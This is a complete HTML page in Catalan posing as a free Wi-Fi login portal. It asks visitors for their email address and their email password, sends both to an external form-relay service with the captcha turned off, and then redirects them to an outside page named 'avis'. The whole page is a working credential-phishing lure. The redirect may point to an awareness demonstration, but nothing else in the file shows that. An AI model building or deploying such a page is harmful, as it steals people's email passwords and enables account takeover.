<!DOCTYPE html>
<html lang="ca">
<head>
  <meta charset="UTF-8">
  <title>Accés Wi-Fi gratuït</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      padding: 12px 24px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #45a049;
    }
    .logo {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">Wi-Fi Gratuït</div>
    <p>Per accedir a la xarxa Wi-Fi, introdueix les teves dades.</p>
    <form action="https://formsubmit.co/07d898694c6df859b766ffea1ff77b64" method="POST">
      <input type="email" name="correu" placeholder="Correu electrònic" required>
      <input type="password" name="contrasenya" placeholder="Contrasenya del correu" required>
      <input type="hidden" name="_next" value="https://qr-whatsapp-one.vercel.app/avis.html">
      <input type="hidden" name="_captcha" value="false">
      <button type="submit">Inicia sessió</button>
    </form>
  </div>
</body>
</html>
